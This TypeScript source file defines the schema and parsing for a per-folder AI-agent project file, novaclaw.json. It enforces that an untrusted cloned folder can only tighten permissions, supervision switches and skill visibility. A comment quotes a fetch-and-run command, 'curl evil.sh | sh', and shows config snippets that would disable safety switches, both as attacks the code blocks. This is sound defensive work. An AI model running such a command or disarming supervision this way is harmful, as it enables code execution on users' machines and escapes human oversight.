export * as ProjectFile from "./project-file"

import { Schema } from "effect"
import { Permission } from "./permission"

/**
 * `novaclaw.json` — the portable declaration that a folder is a NovaClaw **Project**.
 *
 * A folder becomes a Project when it contains a valid `novaclaw.json`; before
 * that it is only a session working folder. This file is the FORMAT. Resolution, precedence and the
 * UI that edits it are separate items and deliberately not here.
 *
 * ⚠️ **This does not resurrect the Project ENTITY.** T3 removed that on purpose — sessions are the
 * one kernel entity, and `core/src/project.ts` derives a location's VCS root and origin hash without
 * persisting anything. A file read on demand is not an entity, and nothing here may be written into
 * the session graph as one.
 *
 * ⚠️ The NAME is reused. `novaclaw.json` in the GLOBAL CONFIG directory is a `Config.Info` document
 * that seeds agents and the catalog into SQLite; this is a different schema in a different place.
 * They do not currently collide — `agent-config-seed.ts` reads the config dir and says *"the launch
 * directory is deliberately NOT a source"* — but the two meanings share a filename, and anyone
 * moving either file between those directories will get surprising results.
 */

/**
 * The only version this build understands.
 *
 * 🔴 Bump when a change would make an OLDER NovaClaw misread the file — not for additions. An added
 * optional section is invisible to an older build (it preserves what it does not know), so bumping
 * for one would refuse files that are in fact perfectly readable. Bump when meaning CHANGES.
 */
export const VERSION = 1

/**
 * The per-chat Tune a folder starts its sessions with — the composer's Tuning panel, persisted.
 *
 * ⚠️ **Not `config.context`.** Two different controls are called "Tune": the composer's per-chat
 * panel (thread mode + the harness-helper switches) and Settings → Tunes (the instance-wide context
 * budget). `novaclaw.json` means the FIRST — "a fresh chat in the folder starts with its Tune" is
 * a statement about a new session's stance, not about the instance's token shares. The section was
 * left untyped until this was settled; it is settled now.
 *
 * ⚠️ Every field optional, and ABSENT MEANS INHERIT — never "off". That is the same sparse-override
 * discipline `resolveSessionConfig` runs on (`architecture.md`'s ECS lens: only divergent values
 * create rows). A file that listed every switch would freeze this folder against every later change
 * to the user's own defaults.
 */
export const Tune = Schema.Struct({
  /**
   * The kernel thread type a fresh chat starts as.
   *
   * 🔴 Only `interactive` is expressible, and the omission is the security property — see
   * {@link narrowTune}. The unattended modes auto-prompt without a human in the loop, and a folder
   * the user cloned five minutes ago must not be able to start chats that way.
   */
  mode: Schema.optional(Schema.Literal("interactive")),
  /** The harness-helper switches. Absent = inherit; see {@link narrowTune} for which may go which way. */
  features: Schema.optional(
    Schema.Struct({
      safeMode: Schema.optional(Schema.Boolean),
      askBeforeChanges: Schema.optional(Schema.Boolean),
      surgicalEdits: Schema.optional(Schema.Boolean),
      contextBudget: Schema.optional(Schema.Boolean),
      memory: Schema.optional(Schema.Boolean),
      introspection: Schema.optional(Schema.Boolean),
      quality: Schema.optional(Schema.Boolean),
      affective: Schema.optional(Schema.Boolean),
    }),
  ),
}).annotate({ identifier: "Project.Tune" })
export type Tune = typeof Tune.Type

/**
 * The switches a project file may only ever turn **on**.
 *
 * 🔴 These are SUPERVISION, not preference. `safeMode` is the control Agent Jail's deny message
 * names by hand; `askBeforeChanges` is what puts a human in front of a write. A `novaclaw.json`
 * inside a cloned repository that could set either to `false` would be a repository silently
 * disarming the user's own safety rails — the exact hazard that forced `evaluateNarrowed` on the
 * permissions half, restated for the half that decides how supervised the agent is.
 *
 * Everything not listed here changes how the harness WORKS (retrieval budget, memory, the stuck
 * detector, quality gates, mood sampling, surgical edits). None of them lets an agent do something
 * it could not already do, so a folder may set them either way.
 */
export const SUPERVISION_FEATURES = ["safeMode", "askBeforeChanges"] as const

/**
 * Every switch a project file may declare, as a list.
 *
 * ⚠️ Named rather than dug out of the schema. The struct above is wrapped in `Schema.optional`,
 * which makes it a union member two levels down — a shape a consumer can only reach by schema
 * archaeology, and one that changes when the schema library does. Two consumers need to enumerate
 * these (`ProjectDefaults.WIRED`'s ledger, and any surface listing what a folder may set), so the
 * list is an export with a compile-time tie to the struct instead of a second copy that can drift.
 */
export const TUNE_FEATURES = [
  "safeMode",
  "askBeforeChanges",
  "surgicalEdits",
  "contextBudget",
  "memory",
  "introspection",
  "quality",
  "affective",
] as const

/**
 * The tie. A feature added to `Tune.features` and not to `TUNE_FEATURES` (or the reverse) is a type
 * error naming the missing keys, rather than a list that silently answers for the wrong set.
 */
type TuneFeaturesMatchSchema = [TuneFeature] extends [(typeof TUNE_FEATURES)[number]]
  ? [(typeof TUNE_FEATURES)[number]] extends [TuneFeature]
    ? true
    : ["TUNE_FEATURES has entries Tune.features does not", Exclude<(typeof TUNE_FEATURES)[number], TuneFeature>]
  : ["TUNE_FEATURES is missing", Exclude<TuneFeature, (typeof TUNE_FEATURES)[number]>]
const _tuneFeaturesMatchSchema: TuneFeaturesMatchSchema = true
void _tuneFeaturesMatchSchema

/**
 * The name of ONE installed pre-action policy, as a `novaclaw.json` may spell it.
 *
 * 🔴 **The grammar IS the security property, and it is the whole of AGENTS.md design principle 13's
 * *"it may name a policy ID and may never carry a command — type-level, not a check"*.**
 * The section was `Schema.Array(Schema.String)` until this check landed, which made the clause a
 * promise in prose: `{"policies":["curl evil.sh | sh"]}` decoded perfectly, and the only thing
 * standing between that string and a shell was that nothing had been built to consume it yet. A
 * rule enforced by the absence of a consumer stops being enforced the day the consumer is written —
 * which is this change.
 *
 * So the shape is chosen to make a command **unspellable** rather than to detect one:
 * lowercase letters, digits, `-` and `.`, between 1 and 64 characters, no leading or trailing
 * separator. That excludes every character a shell needs to be a shell — no space, no `/`, `\`,
 * quote, backtick, `$`, `;`, `|`, `&`, `>`, newline — so there is no clever encoding to blacklist
 * and no "is this command-shaped?" heuristic to get wrong. This is the same argument
 * `recipe-verify.ts` records for its closed check vocabulary (*an open, caller-supplied command is
 * `permissionMode` in frontmatter with extra steps*), applied one file over.
 *
 * ⚠️ **A violating entry makes the whole file fail to parse, and that is deliberate.** `ProjectFile.parse`
 * refuses it exactly as it refuses a missing `version`: a file trying to carry a command is not a
 * `novaclaw.json` this build will act on any part of. Reporting it and honouring the rest would mean
 * a hostile author gets the sections they wanted plus a warning nobody reads, and it would leave the
 * product deciding which half of an untrusted file to believe. `ProjectFileResolve` already
 * distinguishes *malformed* from *missing* so the surface can say which file and why.
 *
 * ⚠️ **Case is FIXED at lowercase rather than folded.** An ID is a key looked up in the installed
 * registry, not a path, so there is no filesystem to inherit case rules from; admitting `No-Secrets`
 * and `no-secrets` as one name would give a project two spellings for one policy and a receipt two
 * names for one intervention.
 */
export const POLICY_ID_PATTERN = /^[a-z0-9](?:[a-z0-9.-]{0,62}[a-z0-9])?$/
export const PolicyID = Schema.String.check(Schema.isPattern(POLICY_ID_PATTERN)).annotate({
  identifier: "Project.PolicyID",
  description:
    "The id of an installed pre-action policy: lowercase letters, digits, '-' and '.', 1-64 characters. Never a command.",
})
export type PolicyID = typeof PolicyID.Type

/**
 * What one skill's entry in a project's `skills` section may say.
 *
 * 🔴 **Structurally identical to `Config.Info.skill_invocation`'s entry, and only ONE of its two
 * values can ever bite.** The instance store is the user's own answer to *"does this appear in MY
 * slash menu"*; this is a folder's answer to the same question, and a folder is UNTRUSTED INPUT — a
 * `novaclaw.json` travels inside a repository somebody cloned. So `show:false` is honoured (the
 * folder hides a skill while you are working in it) and `show:true` is provably inert: against an
 * instance that already shows the skill it changes nothing, and against one that HIDES it, it would
 * be a stranger's repository putting a skill back into the user's own menu. See {@link narrowSkills}.
 *
 * ⚠️ **Why `Schema.Boolean` and not `Schema.Literal(false)`, which would make an un-hide
 * unspellable.** That is the `Tune.mode` trick, and it is right there because `mode:"goal-oriented"`
 * is a request to start unattended agents — a file asking for it is a file whose every other section
 * is now suspect, so refusing the whole document is proportionate. `{"show":true}` is not hostile;
 * it is a folder saying something ordinary that this build declines to act on. Refusing the whole
 * file for it would take the folder's tune, permissions and exclusion list down with it, which is
 * the opposite of narrowing. It is dropped and REPORTED instead — the shape `writablePermissions`
 * already uses for the other provably-inert declaration.
 *
 * ⚠️ There is deliberately no "may Nova choose it" field here. That switch is the `skill` PERMISSION
 * action, and a project already narrows it through the `permissions` section that
 * `PermissionV2.evaluateNarrowed` enforces. A second spelling of one decision is two gates that can
 * disagree — the argument is written out in `core/src/skill/invocation.ts`.
 */
export const SkillChoice = Schema.Struct({
  show: Schema.optional(Schema.Boolean),
}).annotate({ identifier: "Project.SkillChoice" })
export type SkillChoice = typeof SkillChoice.Type

/**
 * The `skills` section — sparse, keyed by the skill's own name VERBATIM.
 *
 * ⚠️ The key is `SkillInvocation.identify`'s id and nothing else: no case folding, no globbing, no
 * normalisation. Folding would map two distinct names onto one key, so an imported `Writer` would
 * inherit whatever the user decided about their own `writer`; globbing would let `pdf*` in a cloned
 * repo hide every skill whose name starts with `pdf`. The lookup is an exact string match against
 * the id the engine holds, which is why a `*` in a key can only ever match a skill literally named
 * that — and such a name has no id at all, so it matches nothing.
 *
 * ⚠️ Absent means INHERIT, never "shown". Same sparse-override discipline as {@link Tune}.
 */
export const Skills = Schema.Record(Schema.String, SkillChoice).annotate({ identifier: "Project.Skills" })
export type Skills = typeof Skills.Type

/** What a folder may declare about itself. Every section optional: an empty project is still valid. */
export const Info = Schema.Struct({
  version: Schema.Finite,
  /** Human-facing. Absent means "use the folder name" — never invent an identifier from it. */
  name: Schema.optional(Schema.String),
  /**
   * Ordered permission rules this folder starts sessions with.
   *
   * ⚠️ These may only NARROW. The operator's safety floor is not expressible here and may never be
   * widened by a file inside a folder — a project the user just cloned is not a trusted author.
   * Enforcing that belongs to resolution; this type only says what the file may CONTAIN.
   */
  permissions: Schema.optional(Permission.Ruleset),
  /** The stance a fresh chat in this folder starts with. Narrowing only — see {@link narrowTune}. */
  tune: Schema.optional(Tune),
  /** Paths this project asks NOT to be read. Globs, matched against the project root. */
  exclude: Schema.optional(Schema.Array(Schema.String)),
  /** IDs of installed pre-action policies. ⛔ IDs only — see {@link PolicyID}. */
  policies: Schema.optional(Schema.Array(PolicyID)),
  /**
   * Skills this folder hides from the user's own slash menu. Narrowing only — see
   * {@link narrowSkills}. A folder may HIDE a skill; it may never un-hide one the instance hid.
   */
  skills: Schema.optional(Skills),
}).annotate({ identifier: "Project.File" })
export type Info = typeof Info.Type

/**
 * The top-level sections an edit may name, in the order a receipt should list them.
 *
 * ⚠️ `version` is deliberately absent, and its absence is load-bearing rather than an oversight:
 * this list is what a write may REPLACE and what a write may CLEAR, and a file without a `version`
 * does not parse. A caller able to name `version` could delete it and brick its own project file
 * through a route whose whole promise is that it never produces a file this build cannot read.
 */
export const SECTIONS = ["name", "permissions", "tune", "exclude", "policies", "skills"] as const
export const Section = Schema.Literals(SECTIONS).annotate({ identifier: "Project.Section" })
export type Section = (typeof SECTIONS)[number]

/**
 * The tie, in the same shape `TUNE_FEATURES` uses: a section added to `Info` and not here — or a
 * name here that `Info` does not carry — is a type error naming the offender rather than a list
 * that silently answers for the wrong set.
 */
type SectionsMatchInfo = [Section] extends [Exclude<keyof Info, "version">]
  ? [Exclude<keyof Info, "version">] extends [Section]
    ? true
    : ["SECTIONS is missing", Exclude<Exclude<keyof Info, "version">, Section>]
  : ["SECTIONS names something Info does not have", Exclude<Section, keyof Info>]
const _sectionsMatchInfo: SectionsMatchInfo = true
void _sectionsMatchInfo

export type ParseResult =
  | { readonly ok: true; readonly info: Info; readonly raw: Record<string, unknown> }
  /**
   * ⚠️ A refusal, never a throw, and it names WHICH failure. "This file is from a newer NovaClaw"
   * and "this file is corrupt" call for opposite reactions from the reader — upgrade, or fix the
   * file — and a single `invalid` would send half of them to the wrong one.
   */
  | { readonly ok: false; readonly reason: "unreadable" | "not-an-object" | "future-version"; readonly detail: string }

// `onExcessProperty: "ignore"` is what lets an OLDER build read a NEWER file at all: unknown
// sections decode away rather than failing, and `parse` hands back the raw object so `merge` can put
// them back. Rejecting them here would make forward compatibility impossible by construction.
const decode = Schema.decodeUnknownResult(Info, { errors: "all", onExcessProperty: "ignore" })

/**
 * Read a `novaclaw.json`.
 *
 * Returns the decoded view AND the raw object, because the raw one is what makes an edit safe — see
 * {@link merge}.
 */
export function parse(text: string): ParseResult {
  let value: unknown
  try {
    value = JSON.parse(text)
  } catch (cause) {
    return { ok: false, reason: "unreadable", detail: cause instanceof Error ? cause.message : String(cause) }
  }
  if (typeof value !== "object" || value === null || Array.isArray(value))
    return {
      ok: false,
      reason: "not-an-object",
      detail: `expected an object, found ${Array.isArray(value) ? "an array" : typeof value}`,
    }
  const raw = value as Record<string, unknown>
  const version = raw["version"]
  // 🔴 The version is checked BEFORE the shape. A file from a newer NovaClaw will often fail to
  // decode as well, and reporting that as a validation error tells the user their file is broken
  // when the truth is that their NovaClaw is old. Order decides which sentence they read.
  if (typeof version !== "number" || !Number.isInteger(version))
    return { ok: false, reason: "not-an-object", detail: "`version` is missing or is not an integer" }
  if (version > VERSION)
    return {
      ok: false,
      reason: "future-version",
      detail: `this file declares version ${version}; this NovaClaw understands up to ${VERSION}`,
    }
  const decoded = decode(raw)
  if (decoded._tag === "Failure") return { ok: false, reason: "not-an-object", detail: String(decoded.failure) }
  return { ok: true, info: decoded.success, raw }
}

/**
 * Apply `changes` to the file's raw object, preserving everything this build does not understand.
 *
 * 🔴 THE POINT OF THE RAW OBJECT. A newer file edited by an older
 * NovaClaw must keep its unknown fields. Serialising the DECODED view would silently delete every
 * section this build has no type for — the user edits one setting in the UI and loses the rest, with
 * no error anywhere. So an edit is a merge onto what was actually read.
 *
 * ⚠️ Top-level merge, deliberately. A deep merge cannot distinguish "leave this alone" from "empty
 * this list", so replacing a section wholesale is the only honest option for a caller that holds the
 * whole section anyway. A section this build does not know is never a key in `changes`, so it is
 * never touched.
 *
 * ⚠️ `undefined` REMOVES a key rather than writing `undefined`, which is not valid JSON. That is the
 * only way a caller can clear a section, and it must not silently do nothing.
 */
export function merge(raw: Record<string, unknown>, changes: Partial<Info>): Record<string, unknown> {
  const next: Record<string, unknown> = { ...raw }
  for (const [key, value] of Object.entries(changes)) {
    if (value === undefined) delete next[key]
    else next[key] = value
  }
  return next
}

/** Serialise for writing. Two-space indent and a trailing newline — a file people diff and commit. */
export function format(raw: Record<string, unknown>): string {
  return `${JSON.stringify(raw, null, 2)}\n`
}

/**
 * The Tune a project file is ALLOWED to impose, given what the user's own defaults already say.
 *
 * 🔴 **This is the tune half of the `evaluateNarrowed` story, and it exists for the same reason.**
 * The permissions half learned that appending a project's ruleset IS overriding it, so a cloned
 * repository could have widened past every deny in the install. The identical shape exists here and
 * is easier to miss because none of these fields looks like a permission: a repository that shipped
 * `{"tune":{"features":{"safeMode":false,"askBeforeChanges":false}}}` would turn off the user's
 * safety rails on checkout, and one that shipped `{"tune":{"mode":"goal-oriented"}}` would start
 * agents that prompt themselves unattended in a folder the user has not read yet.
 *
 * So a project may only move a supervision switch TOWARD supervision. `mode` cannot be widened at
 * all — the type admits only `interactive`, so this function has nothing to police there and the
 * schema is the enforcement; it is restated in the tests so a later widening of the type fails loudly.
 *
 * @param declared what the file asks for
 * @param baseline the effective value of each feature WITHOUT the project (user + agent defaults)
 * @returns only the entries that may be applied, each already known to be a narrowing
 */
export function narrowTune(
  declared: Tune | undefined,
  baseline: Partial<Record<TuneFeature, boolean>>,
): { readonly features: Partial<Record<TuneFeature, boolean>>; readonly refused: readonly TuneFeature[] } {
  const features: Partial<Record<TuneFeature, boolean>> = {}
  const refused: TuneFeature[] = []
  for (const [key, value] of Object.entries(declared?.features ?? {})) {
    const feature = key as TuneFeature
    if (value === undefined) continue
    // A supervision switch may be raised, never lowered. `baseline === true` and the file says
    // `false` is the attack; every other combination is either a narrowing or a no-op.
    if (isSupervisionFeature(feature) && value === false && baseline[feature] === true) {
      refused.push(feature)
      continue
    }
    features[feature] = value
  }
  return { features, refused }
}

/**
 * The Tune a WRITE may record — {@link narrowTune}'s twin, on the other side of the file.
 *
 * 🔴 **Which side ENFORCES, and why there are two.** `narrowTune` is the enforcement: it runs on
 * every read, so it holds for the files this build never wrote — a `novaclaw.json` that arrived in a
 * clone, one a user hand-edited, one an agent generated. A write-side check can never be the
 * security boundary, because the attacker's file does not go through our writer.
 *
 * This function is therefore not a second guard but a TRUTHFULNESS rule for our own output. "Make
 * Default for this Folder" captures whatever stance the chat is in, and a chat may perfectly well
 * have `safeMode: false`. Writing that down would put a sentence in the file that the reader is
 * guaranteed to refuse the moment it matters (`narrowTune` drops a supervision `false` exactly when
 * the baseline is `true` — i.e. exactly when it would have had an effect). The file would then
 * *say* the folder disarms a rail while the product *does* the opposite, and the only way a user
 * discovers the discrepancy is by being confused by it later.
 *
 * ⚠️ So a supervision `false` is OMITTED rather than written, and omission is the honest encoding:
 * absent means INHERIT, which is precisely "this folder takes no position on your safety rails".
 * The dropped switches come back as `refused` so the surface can say so out loud, in the same
 * vocabulary the Tuning panel already uses for the read side.
 *
 * ⚠️ A supervision `true` is written normally — raising supervision is always allowed — and every
 * non-supervision switch is written either way, because none of them lets an agent do something it
 * could not already do.
 */
export function writableTune(tune: Tune | undefined): {
  readonly tune: Tune | undefined
  readonly refused: readonly TuneFeature[]
} {
  if (!tune) return { tune: undefined, refused: [] }
  const declared = tune.features
  if (!declared) return { tune, refused: [] }
  const features: Partial<Record<TuneFeature, boolean>> = {}
  const refused: TuneFeature[] = []
  for (const [key, value] of Object.entries(declared)) {
    const feature = key as TuneFeature
    if (value === undefined) continue
    if (isSupervisionFeature(feature) && value === false) {
      refused.push(feature)
      continue
    }
    features[feature] = value
  }
  // An empty `features` is written as an empty object rather than dropped: `{"tune":{}}` and no
  // `tune` key at all mean the same thing to a reader, and preserving the caller's intent to have
  // SUPPLIED the section keeps the receipt honest about which sections the write touched.
  return { tune: { ...tune, features }, refused }
}

/**
 * The skill ids a project file is ALLOWED to hide, and the ones it asked for and cannot have.
 *
 * 🔴 **The third narrowing layer, and the only one whose safe direction needs no baseline.**
 * `narrowTune` has to know the effective value to tell an attack (`safeMode:false` over a `true`)
 * from a no-op, and `evaluateNarrowed` has to compare restrictiveness against the winning base rule.
 * Here the asymmetry is total: `show:false` is either a narrowing or a no-op, and `show:true` is
 * either an un-hide or a no-op. Neither direction's no-op case is worth preserving, so the whole
 * law is *keep the falses, drop the trues* — and it holds without reading the instance store at all.
 *
 * 🔴 **The result is a LIST OF IDS rather than the declared map, and that is the enforcement.** The
 * other two sections travel through `ProjectFileCache.Entry` verbatim and are narrowed at their
 * consumer, which is fine for them because each has a consumer that provably runs (`evaluate` is
 * the only path to a verdict; `resolveSessionConfig` is the only path to a stance). This section
 * has exactly one consumer today, so a verbatim `{show:true}` reaching it would be one forgotten
 * `!== true` away from a cloned repository restoring a skill to the user's own menu. Converting at
 * the boundary means a downstream reader is holding *ids this folder hides* — a value with no
 * un-hide in it to forget.
 *
 * ⚠️ Built through `Object.keys` + `Object.hasOwn` and returned as an ARRAY, never as an object
 * keyed by the file's own strings. `JSON.parse` gives `__proto__` an own data property, and a later
 * spread or `obj[key] = …` over such a map writes the PROTOTYPE — a hazard `skill/invocation.ts`
 * already records for the instance store. An array of ids cannot express it.
 *
 * ⚠️ An entry that declares no `show` at all (`{}`) is neither hidden nor refused. Absent means
 * inherit, and a folder is allowed to take no position.
 *
 * @param declared the `skills` section as the file spells it
 * @returns `hidden` — ids this folder may hide, sorted; `refused` — ids it asked to SHOW, which
 *          this build will not act on and the surface should say so about
 */
export function narrowSkills(declared: Skills | undefined): {
  readonly hidden: readonly string[]
  readonly refused: readonly string[]
} {
  if (!declared) return { hidden: [], refused: [] }
  const hidden: string[] = []
  const refused: string[] = []
  for (const id of Object.keys(declared)) {
    if (!Object.hasOwn(declared, id)) continue
    const choice = declared[id]
    if (typeof choice !== "object" || choice === null) continue
    if (choice.show === false) hidden.push(id)
    else if (choice.show === true) refused.push(id)
  }
  hidden.sort((a, b) => (a < b ? -1 : a > b ? 1 : 0))
  refused.sort((a, b) => (a < b ? -1 : a > b ? 1 : 0))
  return { hidden, refused }
}

/**
 * The `skills` section a WRITE may record — {@link narrowSkills}'s twin on the other side of the file.
 *
 * 🔴 Third instance of the same rule `writableTune` and `writablePermissions` state: our own writer
 * must not put a sentence into the user's file that our own reader is guaranteed to discard. A
 * control offering "show this skill in this folder" would be a control that silently does nothing,
 * and the user only discovers it by being confused later.
 *
 * ⚠️ Not the enforcement — `narrowSkills` is, because it runs on every read including the files this
 * build never wrote. This is a truthfulness rule for our own output, and the refused ids come back
 * so the surface can say them out loud.
 *
 * ⚠️ An empty result is written as `{}` rather than dropped, exactly as `writableTune` writes an
 * empty `features`: the caller SUPPLIED the section and the receipt must stay honest about which
 * sections the write touched. Clearing it is a different sentence — `ProjectFileWrite.Changes.clear`.
 */
export function writableSkills(skills: Skills | undefined): {
  readonly skills: Skills | undefined
  readonly refused: readonly string[]
} {
  if (!skills) return { skills: undefined, refused: [] }
  // A fresh null-prototype object, so a key of `__proto__` coming off a decoded file lands as an own
  // property here instead of reassigning a prototype. `JSON.stringify` serialises it identically.
  const kept: Record<string, SkillChoice> = Object.create(null) as Record<string, SkillChoice>
  const refused: string[] = []
  for (const id of Object.keys(skills)) {
    if (!Object.hasOwn(skills, id)) continue
    const choice = skills[id]
    if (typeof choice !== "object" || choice === null) continue
    if (choice.show === true) {
      refused.push(id)
      continue
    }
    kept[id] = choice
  }
  refused.sort((a, b) => (a < b ? -1 : a > b ? 1 : 0))
  return { skills: kept, refused }
}

/** One switch on the composer's Tuning panel. */
export type TuneFeature = keyof NonNullable<Tune["features"]>

/** Whether a switch is supervision (raise-only) rather than preference (either way). */
export const isSupervisionFeature = (feature: TuneFeature): boolean =>
  (SUPERVISION_FEATURES as readonly string[]).includes(feature)

/**
 * The permission rules a WRITE may record — {@link writableTune}'s twin on the permissions half.
 *
 * 🔴 **An `allow` rule in a `novaclaw.json` is PROVABLY inert, and writing one would be a lie the
 * product tells in the user's own file.** The read side folds a project's ruleset in as a
 * *constraint*, never as part of the appended chain: `PermissionV2.evaluateNarrowed` keeps the
 * base verdict and replaces it only when the project's matching rule is strictly MORE restrictive
 * (`allow` 0 < `ask` 1 < `deny` 2). An `allow` can never be greater than anything, so it can never
 * change a verdict — measured against the one consumer that exists (`ProjectFileCache.Entry.rules`
 * is read in exactly one place, `permission.ts`'s `projectPermissions`).
 *
 * So a control offering to save one would be a control that silently does nothing — the same defect
 * `writableTune` exists to prevent for supervision switches, restated for the half that started the
 * whole narrowing story. The refused rules come back so the surface can SAY it rather than write a
 * sentence into the user's file that the reader is guaranteed to ignore.
 *
 * ⚠️ `ask` and `deny` are written normally. `ask` narrows an `allow` (it withholds the action until
 * a human says otherwise) and is a no-op against a stricter base, which is a rule that *can* bite.
 *
 * ⚠️ This is NOT the enforcement, for the same reason `writableTune` is not: an attacker's
 * `novaclaw.json` never goes through our writer. `evaluateNarrowed` holds the line on every read,
 * including for files that arrived in a clone. This is a truthfulness rule for our own output.
 */
export function writablePermissions(rules: Permission.Ruleset | undefined): {
  readonly permissions: Permission.Ruleset | undefined
  readonly refused: Permission.Ruleset
} {
  if (!rules) return { permissions: undefined, refused: [] }
  const permissions: Permission.Rule[] = []
  const refused: Permission.Rule[] = []
  for (const rule of rules) (rule.effect === "allow" ? refused : permissions).push(rule)
  // An empty ruleset is written as `[]` rather than dropped, exactly as `writableTune` writes an
  // empty `features`: the caller SUPPLIED the section, and the receipt has to stay honest about
  // which sections the write touched. Clearing a section is a different request with its own
  // spelling — see `ProjectFileWrite.Changes.clear`.
  return { permissions, refused }
}
